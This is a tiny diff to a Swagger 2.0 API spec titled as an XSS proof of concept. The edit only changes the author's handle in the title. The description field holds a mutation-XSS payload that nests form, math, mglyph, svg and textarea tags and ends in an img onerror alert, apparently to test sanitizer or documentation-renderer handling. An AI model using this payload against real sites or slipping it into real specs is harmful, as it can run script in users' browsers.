@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: XSS POC BY @Salem_Nabeel
+  title: XSS POC BY @Salem_Nabil
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
   
